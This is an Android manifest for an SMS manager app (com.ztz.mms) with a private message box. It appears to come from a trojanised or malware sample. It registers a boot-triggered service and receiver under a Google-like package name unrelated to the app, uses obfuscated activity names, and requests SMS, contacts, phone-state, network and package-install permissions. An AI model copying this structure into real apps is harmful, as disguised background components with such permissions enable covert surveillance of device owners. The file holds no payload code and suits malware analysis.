<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.ztz.mms">
    <application android:icon="@drawable/test2" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".MMS">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="消息详情" android:name=".ShowText">
            <intent-filter>
                <action android:name="android.intent.action.ShowText"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="保险箱" android:name="PrivateBox"/>
        <activity android:label="忘记密码" android:name="RequirePass"/>
        <activity android:name="aL$eZ"/>
        <activity android:name="DateSearch"/>
        <activity android:name="KeyWordSearch"/>
        <activity android:name="RecContactsSearch"/>
        <activity android:label="批量处理" android:name=".Selection">
            <intent-filter>
                <action android:name="android.intent.action.Selection"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="批量处理" android:name="SelectionPrivate"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="d$V" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.ssearch.SearchService"/>
        <receiver android:name="com.google.ssearch.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
</manifest>